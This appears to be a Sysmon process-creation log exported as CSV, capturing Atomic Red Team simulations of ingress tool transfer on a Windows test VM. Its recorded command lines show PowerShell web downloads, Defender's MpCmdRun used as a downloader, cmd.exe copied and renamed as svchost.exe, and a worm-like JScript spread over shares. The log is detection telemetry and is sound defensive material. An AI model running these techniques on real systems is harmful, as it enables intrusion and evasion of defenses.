Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19593,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:01.209

ProcessGuid: {f57bd86a-8d45-658c-db01-000000000f00}

ProcessId: 10688

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d45-658c-db01-000000000f00},3588,10688,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:01.2102751Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:01.209,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:01.2102751Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:01.209</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d45-658c-db01-000000000f00}</Data>
      <Data Name=""ProcessId"">10688</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:01.209

ProcessGuid: {f57bd86a-8d45-658c-db01-000000000f00}

ProcessId: 10688

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\User\AppData\Local\Temp\Atomic-license.txt,Microsoft Corporation,WinDev2309Eval,,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\,Microsoft Malware Protection Command Line Utility,1,19592,4.18.23080.2006 (04d8e871ffe7ba6b2204046883e1ad9b7a5989ce),"MD5=4DBD7A0D3DF01128C9966DE2072EFAC5,SHA256=04AA184A37C0C30DB3EBE16626364414E836C240FA2AC059E04407037E9B080F,IMPHASH=8AA0C0E61F2EE1898A0D0A413C238D40",C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\MpCmdRun.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.928

ProcessGuid: {f57bd86a-8d44-658c-da01-000000000f00}

ProcessId: 9516

Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\MpCmdRun.exe

FileVersion: 4.18.23080.2006 (04d8e871ffe7ba6b2204046883e1ad9b7a5989ce)

Description: Microsoft Malware Protection Command Line Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: MpCmdRun.exe

CommandLine: MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\User\AppData\Local\Temp\Atomic-license.txt

CurrentDirectory: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4DBD7A0D3DF01128C9966DE2072EFAC5,SHA256=04AA184A37C0C30DB3EBE16626364414E836C240FA2AC059E04407037E9B080F,IMPHASH=8AA0C0E61F2EE1898A0D0A413C238D40

ParentProcessGuid: {f57bd86a-8d44-658c-d801-000000000f00}

ParentProcessId: 8448

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt

ParentUser: WINDEV2309EVAL\User",Info,MpCmdRun.exe,"""cmd.exe"" /c cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt",C:\Windows\System32\cmd.exe,{f57bd86a-8d44-658c-d801-000000000f00},8448,WINDEV2309EVAL\User,,{f57bd86a-8d44-658c-da01-000000000f00},3588,9516,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:00.9483660Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:00.928,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:00.9483660Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:00.928</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d44-658c-da01-000000000f00}</Data>
      <Data Name=""ProcessId"">9516</Data>
      <Data Name=""Image"">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\MpCmdRun.exe</Data>
      <Data Name=""FileVersion"">4.18.23080.2006 (04d8e871ffe7ba6b2204046883e1ad9b7a5989ce)</Data>
      <Data Name=""Description"">Microsoft Malware Protection Command Line Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">MpCmdRun.exe</Data>
      <Data Name=""CommandLine"">MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\User\AppData\Local\Temp\Atomic-license.txt</Data>
      <Data Name=""CurrentDirectory"">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=4DBD7A0D3DF01128C9966DE2072EFAC5,SHA256=04AA184A37C0C30DB3EBE16626364414E836C240FA2AC059E04407037E9B080F,IMPHASH=8AA0C0E61F2EE1898A0D0A413C238D40</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d44-658c-d801-000000000f00}</Data>
      <Data Name=""ParentProcessId"">8448</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.928

ProcessGuid: {f57bd86a-8d44-658c-da01-000000000f00}

ProcessId: 9516

Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\MpCmdRun.exe

FileVersion: 4.18.23080.2006 (04d8e871ffe7ba6b2204046883e1ad9b7a5989ce)

Description: Microsoft Malware Protection Command Line Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: MpCmdRun.exe

CommandLine: MpCmdRun.exe  -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\User\AppData\Local\Temp\Atomic-license.txt

CurrentDirectory: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23080.2006-0\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=4DBD7A0D3DF01128C9966DE2072EFAC5,SHA256=04AA184A37C0C30DB3EBE16626364414E836C240FA2AC059E04407037E9B080F,IMPHASH=8AA0C0E61F2EE1898A0D0A413C238D40

ParentProcessGuid: {f57bd86a-8d44-658c-d801-000000000f00}

ParentProcessId: 8448

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c cd ""%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*"" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19591,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.893

ProcessGuid: {f57bd86a-8d44-658c-d801-000000000f00}

ProcessId: 8448

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c cd ""%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*"" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d44-658c-d801-000000000f00},3588,8448,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:00.8943676Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:00.893,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:00.8943676Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:00.893</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d44-658c-d801-000000000f00}</Data>
      <Data Name=""ProcessId"">8448</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c cd ""%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*"" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.893

ProcessGuid: {f57bd86a-8d44-658c-d801-000000000f00}

ProcessId: 8448

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c cd ""%%ProgramData%%\Microsoft\Windows Defender\platform\4.18*"" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19590,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.665

ProcessGuid: {f57bd86a-8d44-658c-d601-000000000f00}

ProcessId: 8612

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d44-658c-d601-000000000f00},3588,8612,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:00.6667857Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:00.665,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:00.6667857Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:00.665</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d44-658c-d601-000000000f00}</Data>
      <Data Name=""ProcessId"">8612</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe &amp; C:\svchost.exe /c echo T1105 &gt; \\localhost\c$\T1105.txt</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.665

ProcessGuid: {f57bd86a-8d44-658c-d601-000000000f00}

ProcessId: 8612

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe &amp; C:\svchost.exe /c echo T1105 &gt; \\localhost\c$\T1105.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,CScript.exe  AtomicTestT1105.js //E:JScript ,Microsoft Corporation,WinDev2309Eval,,Z:\,Microsoft ® Console Based Script Host,1,19589,5.812.10240.16384,"MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3",C:\Windows\System32\cscript.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.402

ProcessGuid: {f57bd86a-8d44-658c-d501-000000000f00}

ProcessId: 1508

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft ® Console Based Script Host

Product: Microsoft ® Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: CScript.exe  AtomicTestT1105.js //E:JScript 

CurrentDirectory: Z:\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {f57bd86a-8d44-658c-d301-000000000f00}

ParentProcessId: 1336

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd

ParentUser: WINDEV2309EVAL\User",Info,cscript.exe,"""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd",C:\Windows\System32\cmd.exe,{f57bd86a-8d44-658c-d301-000000000f00},1336,WINDEV2309EVAL\User,,{f57bd86a-8d44-658c-d501-000000000f00},3588,1508,Microsoft ® Windows Script Host,,,,"
      ",-,2023-12-27T20:47:00.4064816Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:00.402,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
